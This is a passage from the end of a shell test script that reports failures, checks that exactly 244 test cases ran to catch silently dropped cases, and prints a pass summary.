    echo "$FAILED case(s) FAILED"
    exit 1
fi

# Total-count guard: every assert_rc/skip_case increments CASES; a drift here
# means a case was silently dropped (or an early exit skipped the tail) even
# though nothing FAILED. Update EXPECTED_CASES deliberately when adding/
# removing a case.
EXPECTED_CASES=244   # HIMMEL-7907: rows held only by the removed GLM tail dropped; +1 hooks.json registration row
if [ "$CASES" -ne "$EXPECTED_CASES" ]; then
    echo "CASE-COUNT MISMATCH — ran $CASES, expected $EXPECTED_CASES"
    exit 1
fi
if [ "$SKIPPED" -ne 0 ]; then
    echo "all cases passed ($CASES/$EXPECTED_CASES, $SKIPPED skipped)"
else
    echo "all cases passed ($CASES/$EXPECTED_CASES)"
fi
exit 0
